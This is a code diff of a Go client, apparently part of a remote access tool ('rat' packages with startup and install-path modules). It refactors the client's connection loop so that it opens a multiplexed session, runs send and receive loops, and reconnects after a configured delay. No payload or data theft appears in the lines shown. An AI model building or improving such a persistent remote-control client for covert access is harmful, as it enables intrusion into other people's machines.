@@ -9,6 +9,7 @@ import (
 	"rat/client/startup"
 	"rat/shared"
 	"rat/shared/installpath"
+	"time"
 
 	"github.com/xtaci/smux"
 )
@@ -57,40 +58,25 @@ func start(config shared.BinaryConfig) {
 		})
 		session, err := smux.Client(conn, nil)
 		if err != nil {
-
 			panic(err)
 		}
-		control, err := session.AcceptStream()
-		if err != nil {
-			panic(err)
-		}
-		fmt.Println("stream opened")
 
-		con := Connection{
-			Conn:    session,
-			control: control,
-		}
-
+		con, err := NewConnection(session)
 		if err != nil {
 			panic(err)
 		}
 
-		Queue = make(chan Outgoing)
 		//Transfers = make(TransfersMap)
 
 		go con.writeLoop()
+		go con.recvLoop()
+
 		con.Init()
-		con.recvLoop()
+		<-con.die
 
-		/* end:
-		Close()
-		time.Sleep(time.Second * time.Duration(config.Delay)) */
+		con.Close()
+		time.Sleep(time.Second * time.Duration(config.Delay))
 	}
-}
-
-// Close is called when connection is lost
-func Close() {
-
 }
 
 func Uninstall() {
